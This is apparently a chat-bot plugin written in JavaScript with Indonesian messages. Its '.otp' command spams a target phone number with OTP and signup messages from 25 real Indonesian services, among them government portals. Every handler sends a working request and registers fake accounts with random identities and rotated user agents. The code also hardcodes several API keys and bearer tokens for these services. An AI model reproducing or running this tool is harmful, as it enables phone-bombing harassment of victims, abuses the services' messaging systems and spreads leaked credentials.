import axios from 'axios'
import { f } from '../../src/lib/ourin-http.js'
import te from '../../src/lib/ourin-error.js'
import config from '../../config.js'

const pluginConfig = {
    name: 'otp',
    alias: ['spam', 'otpspam', 'bomb'],
    category: 'tools',
    description: 'Mengirim OTP ke berbagai layanan Indonesia',
    usage: '.otp <nomor> <layanan/all>',
    example: '.otp 08123456789 all',
    isOwner: false,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 10,
    energi: 2,
    isEnabled: true
}

// Daftar layanan
const SERVICES = [
    { id: 'hrsbre', name: 'HRS-BRE' },
    { id: 'erafone', name: 'Erafone' },
    { id: 'planetban', name: 'Planetban' },
    { id: 'tuneup', name: 'Tuneup' },
    { id: 'hashmicro', name: 'HashMicro' },
    { id: 'klook', name: 'Klook' },
    { id: 'internetrakyat', name: 'Internet Rakyat' },
    { id: 'ultramilk', name: 'Ultramilk' },
    { id: 'kaniva', name: 'Kaniva' },
    { id: 'jembatani', name: 'Jembatani' },
    { id: 'rcx', name: 'RCX' },
    { id: 'sahabatteknisi', name: 'Sahabat Teknisi' },
    { id: 'auto2000', name: 'Auto2000' },
    { id: 'astradaihatsu', name: 'Astra Daihatsu' },
    { id: 'royalcanin', name: 'Royal Canin' },
    { id: 'watsons', name: 'Watsons' },
    { id: '99co', name: '99.co' },
    { id: 'belirumah', name: 'Belirumah.co' },
    { id: 'fastwork', name: 'Fastwork' },
    { id: 'beautyhaul', name: 'Beautyhaul' },
    { id: 'hainaya', name: 'Hainaya' },
    { id: 'minumyukkaka', name: 'Minum Yukkaka' },
    { id: 'sidemang', name: 'Sidemang Palembang' },
    { id: 'lapormasbup', name: 'Lapormasbup Klaten' },
    { id: 'ptspkemenag', name: 'PTSP Kemenag' }
]

// ==================== HANDLER FUNCTIONS ====================

// 1. HRS-BRE
async function sendHrsbreOTP(phone) {
    try {
        const BASE_URL = "https://career.hrs-bre.site"
        const SIGN_UP_PAGE = `${BASE_URL}/auth/sign_up`
        const SIGN_UP_URL = `${BASE_URL}/auth/sign_up_action`

        const nik = randomDigits(16)
        const email = randomString(8) + '@' + ['gmail.com', 'yahoo.com', 'mailnesia.com'][Math.floor(Math.random() * 3)]
        const username = randomString(8)
        const password = 'Aa1' + randomString(7) + '#$%&!'

        const boundary = "----WebKitFormBoundary" + randomString(16)
        const body = `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="nik"\r\n\r\n${nik}\r\n` +
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="whatsapp"\r\n\r\n${phone}\r\n` +
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="username"\r\n\r\n${username}\r\n` +
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="password"\r\n\r\n${password}\r\n` +
            `--${boundary}--\r\n`

        const response = await axios.post(SIGN_UP_URL, body, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "Origin": BASE_URL,
                "Referer": SIGN_UP_PAGE
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 2. Erafone
async function sendErafoneOTP(phone) {
    try {
        const url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        const payload = { identifier: phone, type: "identifier_validation" }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
                "otp-provider": "whatsapp",
                "Content-Type": "application/json",
                "Origin": "https://erafone.com"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 3. Planetban
async function sendPlanetbanOTP(phone) {
    try {
        const url = "https://api.planetban.com/website/customer/request-otp"
        const payload = {
            name: "Test",
            phone: phone,
            password: "Test123",
            purpose: "register",
            method: "whatsapp"
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://planetban.com"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 4. Tuneup
async function sendTuneupOTP(phone) {
    try {
        const url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        const name = randomString(8)
        const company = "PT " + name.charAt(0).toUpperCase() + name.slice(1)
        const data = new URLSearchParams({
            company_name: company,
            owner_name: name.charAt(0).toUpperCase() + name.slice(1),
            address: randomString(10),
            email: name + "@mailnesia.com",
            phone_number: phone,
            province_code: "32",
            city_code: "32.04",
            subscription_id: "undefined",
            channel: "whatsapp",
            agreement: "true",
            "service_categories[]": "3"
        })
        const response = await axios.post(url, data.toString(), {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://dashboard.tuneup.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 5. HashMicro
async function sendHashmicroOTP(phone) {
    try {
        const name = 'User' + randomString(5)
        const email = name.toLowerCase() + '@gmail.com'
        const company = 'PT ' + name

        const payload = {
            medium: '55',
            type_button: 'mulai-konsultasi',
            fullname: name,
            phonenumber: phone,
            email: email,
            companyname: company,
            company_size: 'small',
            solution: '43',
            industry: ['178', '179', '180'][Math.floor(Math.random() * 3)],
            message: 'Test',
            country: '100',
            clr_id: ['mq51xj8x-WzwfG4IcQKi0c056', 'abc123'][Math.floor(Math.random() * 2)],
            campaigndata: 'HashMicro',
            source: '143',
            user_agent: getRandomUA(),
            user_device: 'mobile',
            scroll_depth: '100',
            conversion_tracked: 'Yes',
            fingerprint: uuidv4().replace(/-/g, ''),
            scale: 'small',
            position: '43',
            team: '6',
            ipaddrs: '127.0.0.1',
            uip: '127.0.0.1',
            provn: 'Jakarta'
        }

        // HashMicro biasanya mengirim via form, kita return payload
        return { success: true, status: 200, data: payload }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 6. Klook
async function sendKlookOTP(phone) {
    try {
        const url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + uuidv4()
        const payload = {
            action: "login_register",
            type: 1,
            rcv: phone,
            is_resend: false,
            payload: {
                mobile: phone,
                term_ids: [330],
                mobile_token: "",
                invite_code: ""
            },
            _rc: "",
            rcv_token: ""
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://www.klook.com",
                "Referer": "https://www.klook.com/en-SG/signin/?aid=87721"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 7. Internet Rakyat
async function sendInternetRakyatOTP(phone) {
    try {
        const url = "https://internetrakyat.id/api/app/auth/send-otp-register"
        const payload = { phone_number: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "x-api-key": "280999!FTTH",
                "Origin": "https://internetrakyat.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 8. Ultramilk
async function sendUltramilkOTP(phone) {
    try {
        const url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        const name = 'User' + randomString(4)
        const email = name.toLowerCase() + '@gmail.com'
        const password = 'Pass' + randomString(6) + '@1'
        const payload = {
            name: name,
            email: email,
            password: password,
            phone_number: phone,
            portal: "IcownicPatch",
            is_consent: true
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://www.icownicpatch.com"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 9. Kaniva
async function sendKanivaOTP(phone) {
    try {
        const name = 'User' + randomString(4)
        const url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
        const payload = { name: name, phone: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "X-Inertia": "true",
                "Origin": "https://daftar.kanivainternationalbali.com"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 10. Jembatani
async function sendJembataniOTP(phone) {
    try {
        const name = 'User' + randomString(4)
        const password = 'Pass' + randomString(6) + '@1'
        const url = "https://api.jembatani.co.id/v1/register"
        const payload = {
            phone_number: phone,
            name: name,
            role: "farmer",
            password: password,
            password_confirmation: password,
            consent: "1"
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98",
                "Origin": "https://jembatani.co.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 11. RCX
async function sendRcxOTP(phone) {
    try {
        const name = 'User' + randomString(4)
        const email = name.toLowerCase() + '@gmail.com'
        const url = "https://sso.rcx.co.id/auth/passwordless/request"
        const data = new URLSearchParams({
            mode: "register",
            channel: "whatsapp",
            name: name,
            email: email,
            identifier: phone
        })
        const response = await axios.post(url, data.toString(), {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://sso.rcx.co.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 12. Sahabat Teknisi
async function sendSahabatTeknisiOTP(phone) {
    try {
        const url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        const payload = { phone: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://www.sahabatteknisi.co.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 13. Auto2000
async function sendAuto2000OTP(phone) {
    try {
        const url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
        const payload = {
            phoneNumber: phone,
            isCheckOtpLimit: true,
            uniqueID: phone,
            isLogin: false
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://auto2000.co.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 14. Astra Daihatsu
async function sendAstraDaihatsuOTP(phone) {
    try {
        const url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        const payload = { phoneNo: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://www.astra-daihatsu.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 15. Royal Canin
async function sendRoyalCaninOTP(phone) {
    try {
        const url = "https://club.royalcanin.id/api/get_otp"
        const payload = {
            params: {
                Email: "",
                mobile_number: phone,
                OTPType: "IM"
            }
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://club.royalcanin.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 16. Watsons
async function sendWatsonsOTP(phone) {
    try {
        const url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        const payload = {
            uid: "",
            action: "GENERAL",
            countryCode: "62",
            target: phone,
            type: "WHATSAPP"
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
                "Origin": "https://www.watsons.co.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 17. 99.co
async function send99coOTP(phone) {
    try {
        const url = "https://www.99.co/id/api/biz/messaging/otp-events"
        const payload = {
            brand: "99id",
            destination_address: phone,
            type_id: 2
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://www.99.co"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 18. Belirumah.co
async function sendBelirumahOTP(phone) {
    try {
        const url = "https://api.belirumah.co/api/otp/request_new"
        const payload = { phone_number: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://belirumah.co"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 19. Fastwork
async function sendFastworkOTP(phone) {
    try {
        const url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        const payload = { phone_number: phone }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://fastwork.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 20. Beautyhaul
async function sendBeautyhaulOTP(phone) {
    try {
        const base = "https://www.beautyhaul.com"
        const firstName = randomString(5).charAt(0).toUpperCase() + randomString(5).slice(1)
        const lastName = randomString(5).charAt(0).toUpperCase() + randomString(5).slice(1)
        const email = firstName.toLowerCase() + Math.floor(Math.random() * 900 + 100) + '@gmail.com'
        const password = "Testt#12334"

        // Register dulu
        const regPayload = {
            nama_depan: firstName,
            nama_belakang: lastName,
            email: email,
            nomor_kode_id: "100",
            nomor_kode_value: "62",
            nomor_ponsel: phone,
            password: password,
            konfirmasi_password: password,
            tanggal_lahir: "20 Jun 2015",
            jenis_kelamin: ["Female", "Male"][Math.floor(Math.random() * 2)],
            subscribe: "true",
            terms: "true"
        }

        await axios.post(base + "/ajax/account/save_register", regPayload, {
            headers: { "User-Agent": getRandomUA(), "Content-Type": "application/json" },
            timeout: 12000
        }).catch(() => {})

        // Kirim OTP
        const otpPayload = { method: "WhatsApp" }
        const response = await axios.post(base + "/ajax/account/send_otp", otpPayload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": base
            },
            timeout: 12000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 21. Hainaya
async function sendHainayaOTP(phone) {
    try {
        const prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
        const mid = randomString(Math.floor(Math.random() * 4) + 3)
        const businessName = prefixes[Math.floor(Math.random() * prefixes.length)] +
            mid.charAt(0).toUpperCase() + mid.slice(1) +
            Math.floor(Math.random() * 990 + 10)

        const url = "https://app.hainaya.id/api/onboarding/register"
        const payload = {
            business_name: businessName,
            vertical: "salon",
            vendor_type: "nail_salon",
            business_phone: phone,
            owner_name: "",
            owner_phone: phone
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://app.hainaya.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 22. Minum Yukkaka
async function sendMinumYukkakaOTP(phone) {
    try {
        const firstName = randomString(Math.floor(Math.random() * 5) + 4)
        const email = firstName.toLowerCase() + Math.floor(Math.random() * 900 + 100) + '@gmail.com'
        const password = "pass#" + randomString(4)

        // Register
        const registerData = new URLSearchParams({
            "registerModel[first_name]": firstName,
            "registerModel[last_name]": "",
            "registerModel[email]": email,
            "registerModel[phone]": phone,
            "registerModel[otp]": "",
            "registerModel[gender]": "",
            "registerModel[date_of_birth]": "",
            "registerModel[IsAddressRequired]": "false",
            "registerModel[address]": "",
            "registerModel[additional_address]": "",
            "registerModel[city]": "",
            "registerModel[zip]": "",
            "registerModel[country_code]": "",
            "registerModel[country]": "",
            "registerModel[state]": "",
            "registerModel[password]": password,
            "registerModel[verify_password]": password,
            "registerModel[pin]": "",
            "registerModel[verify_pin]": ""
        })

        await axios.post("https://minumyukkaka.com/services/liquid/Register", registerData.toString(), {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": getRandomUA()
            },
            timeout: 15000
        }).catch(() => {})

        // Request OTP
        const otpData = new URLSearchParams({
            destination: phone,
            otpLength: "6"
        })
        const response = await axios.post("https://minumyukkaka.com/services/identity/requestOTP", otpData.toString(), {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": getRandomUA()
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 23. Sidemang Palembang
async function sendSidemangOTP(phone) {
    try {
        const emailName = randomString(Math.floor(Math.random() * 6) + 5)
        const email = emailName + Math.floor(Math.random() * 900 + 100) + '@gmail.com'
        const url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        const payload = { phoneNumber: phone, email: email }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://sidemang.palembang.go.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 24. Lapormasbup Klaten
const registeredPhones = new Set()
async function sendLapormasbupOTP(phone) {
    try {
        if (registeredPhones.has(phone)) {
            const url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
            const payload = { mobilephone: phone }
            const response = await axios.post(url, payload, {
                headers: {
                    "User-Agent": getRandomUA(),
                    "Content-Type": "application/json",
                    "Origin": "https://lapormasbup.klaten.go.id"
                },
                timeout: 15000
            })
            return { success: true, status: response.status, data: response.data }
        }

        const name = randomString(Math.floor(Math.random() * 5) + 4)
        const email = name.toLowerCase() + Math.floor(Math.random() * 900 + 100) + '@gmail.com'
        const password = "Pass" + randomString(4) + "$"
        const birthDate = `${Math.floor(Math.random() * 45) + 1966}-${String(Math.floor(Math.random() * 12) + 1).padStart(2, '0')}-${String(Math.floor(Math.random() * 28) + 1).padStart(2, '0')}`
        const address = `Jl. ${randomString(6)} No. ${Math.floor(Math.random() * 200) + 1}`
        const gender = ['Laki-Laki', 'Perempuan'][Math.floor(Math.random() * 2)]

        const url = "https://lapormasbup.klaten.go.id/api/register"
        const payload = {
            name: name,
            email: email,
            mobilephone: phone,
            gender: gender,
            warga_birth_date: birthDate,
            password: password,
            address: address
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://lapormasbup.klaten.go.id"
            },
            timeout: 15000
        })

        if (response.status === 200 || response.status === 400) {
            registeredPhones.add(phone)
        }

        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// 25. PTSP Kemenag
async function sendPTSPKemenagOTP(phone) {
    try {
        const name = randomString(Math.floor(Math.random() * 5) + 4)
        const email = name.toLowerCase() + Math.floor(Math.random() * 900 + 100) + '@gmail.com'
        const chars = randomString(6) + randomDigits(2)
        const password = 'Pass' + chars.split('').sort(() => Math.random() - 0.5).join('') + '$'

        const url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        const payload = {
            nama: name,
            wa: phone,
            email: email,
            password: password
        }
        const response = await axios.post(url, payload, {
            headers: {
                "User-Agent": getRandomUA(),
                "Content-Type": "application/json",
                "Origin": "https://dev-ptsp.kemenag.go.id"
            },
            timeout: 15000
        })
        return { success: true, status: response.status, data: response.data }
    } catch (e) {
        return { success: false, error: e.message }
    }
}

// ==================== UTILITY FUNCTIONS ====================

function randomString(length = 8) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let result = ''
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result
}

function randomDigits(length = 8) {
    let result = ''
    for (let i = 0; i < length; i++) {
        result += Math.floor(Math.random() * 10)
    }
    return result
}

function getRandomUA() {
    const uas = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36'
    ]
    return uas[Math.floor(Math.random() * uas.length)]
}

function uuidv4() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0
        const v = c === 'x' ? r : (r & 0x3 | 0x8)
        return v.toString(16)
    })
}

function formatPhone(phone) {
    let clean = phone.replace(/[^0-9+]/g, '')
    if (clean.startsWith('+62')) {
        clean = '0' + clean.substring(3)
    } else if (clean.startsWith('62')) {
        clean = '0' + clean.substring(2)
    }
    return clean
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

// ==================== MAIN HANDLER ====================

async function handler(m, { sock }) {
    const args = m.args || []
    const text = args.join(' ')

    if (!text || args.length < 1) {
        return m.reply(`📱 *OTP SPAMMER*\n\n` +
            `> Kirim OTP ke berbagai layanan Indonesia\n\n` +
            `*Penggunaan:*\n` +
            `• \`${m.prefix}otp 08123456789 all\` - Spam semua layanan\n` +
            `• \`${m.prefix}otp 08123456789 klook\` - Spam spesifik\n` +
            `• \`${m.prefix}otplist\` - Lihat daftar layanan\n\n` +
            `*Contoh:*\n` +
            `\`${m.prefix}otp 081234567890 all\``)
    }

    // Cek perintah list
    if (args[0] === 'list' || args[0] === 'daftar' || args[0] === 'services') {
        let response = `📋 *DAFTAR LAYANAN OTP*\n\n`
        SERVICES.forEach((s, i) => {
            response += `${i + 1}. *${s.name}* - \`${s.id}\`\n`
        })
        response += `\n*Gunakan:* \`${m.prefix}otp <nomor> <id/all>\``
        return m.reply(response)
    }

    const phone = args[0]
    const serviceId = args[1] || 'all'

    // Validasi nomor
    const phoneRegex = /^(\+62|62|0)8[1-9][0-9]{6,10}$/
    if (!phoneRegex.test(phone)) {
        return m.reply('❌ *Format nomor tidak valid!*\n\n' +
            'Gunakan format:\n' +
            '• 081234567890\n' +
            '• 6281234567890\n' +
            '• +6281234567890')
    }

    const formattedPhone = formatPhone(phone)
    m.react('🔄')

    if (serviceId === 'all') {
        // Spam semua layanan
        await m.reply(`🔄 *Memulai spam OTP ke SEMUA layanan*\n` +
            `📞 Nomor: ${formattedPhone}\n` +
            `📋 Total: ${SERVICES.length} layanan\n` +
            `⏳ Mohon tunggu...`)

        const results = []
        let successCount = 0
        let failedCount = 0

        for (const service of SERVICES) {
            try {
                const handlerFn = getHandler(service.id)
                if (!handlerFn) {
                    results.push({ name: service.name, success: false, error: 'Handler not found' })
                    failedCount++
                    continue
                }
                const result = await handlerFn(formattedPhone)
                if (result.success) {
                    results.push({ name: service.name, success: true, status: result.status })
                    successCount++
                } else {
                    results.push({ name: service.name, success: false, error: result.error })
                    failedCount++
                }
                await sleep(1000) // Delay 1 detik
            } catch (e) {
                results.push({ name: service.name, success: false, error: e.message })
                failedCount++
            }
        }

        let response = `📊 *LAPORAN SPAM OTP*\n\n`
        response += `📞 Nomor: ${formattedPhone}\n`
        response += `✅ Berhasil: ${successCount}\n`
        response += `❌ Gagal: ${failedCount}\n`
        response += `📋 Total: ${SERVICES.length}\n\n`
        response += `*Detail:*\n`

        results.forEach(r => {
            const icon = r.success ? '✅' : '❌'
            response += `${icon} ${r.name}`
            if (r.success) {
                response += ` (${r.status})\n`
            } else {
                response += ` - ${r.error}\n`
            }
        })

        m.react('✅')
        return m.reply(response)
    }

    // Spam satu layanan
    const service = SERVICES.find(s => s.id === serviceId)
    if (!service) {
        return m.reply(`❌ *Layanan tidak ditemukan!*\n\n` +
            `Gunakan \`${m.prefix}otplist\` untuk melihat daftar layanan`)
    }

    const handlerFn = getHandler(serviceId)
    if (!handlerFn) {
        return m.reply(`❌ *Handler untuk ${service.name} tidak tersedia*`)
    }

    m.reply(`📱 *Mengirim OTP ke ${service.name}*\n` +
        `📞 Nomor: ${formattedPhone}\n` +
        `⏳ Mohon tunggu...`)

    try {
        const result = await handlerFn(formattedPhone)
        m.react('✅')

        let response = `📱 *${service.name}*\n`
        response += `📞 Nomor: ${formattedPhone}\n`
        response += `⏱️ Waktu: ${new Date().toLocaleString('id-ID')}\n\n`

        if (result.success) {
            response += `✅ *Berhasil dikirim*`
            if (result.status) response += ` (${result.status})`
        } else {
            response += `❌ *Gagal:* ${result.error}`
        }

        return m.reply(response)
    } catch (error) {
        m.react('☢')
        return m.reply(`❌ *Error:* ${error.message}`)
    }
}

function getHandler(id) {
    const handlers = {
        'hrsbre': sendHrsbreOTP,
        'erafone': sendErafoneOTP,
        'planetban': sendPlanetbanOTP,
        'tuneup': sendTuneupOTP,
        'hashmicro': sendHashmicroOTP,
        'klook': sendKlookOTP,
        'internetrakyat': sendInternetRakyatOTP,
        'ultramilk': sendUltramilkOTP,
        'kaniva': sendKanivaOTP,
        'jembatani': sendJembataniOTP,
        'rcx': sendRcxOTP,
        'sahabatteknisi': sendSahabatTeknisiOTP,
        'auto2000': sendAuto2000OTP,
        'astradaihatsu': sendAstraDaihatsuOTP,
        'royalcanin': sendRoyalCaninOTP,
        'watsons': sendWatsonsOTP,
        '99co': send99coOTP,
        'belirumah': sendBelirumahOTP,
        'fastwork': sendFastworkOTP,
        'beautyhaul': sendBeautyhaulOTP,
        'hainaya': sendHainayaOTP,
        'minumyukkaka': sendMinumYukkakaOTP,
        'sidemang': sendSidemangOTP,
        'lapormasbup': sendLapormasbupOTP,
        'ptspkemenag': sendPTSPKemenagOTP
    }
    return handlers[id] || null
}

export { pluginConfig as config, handler }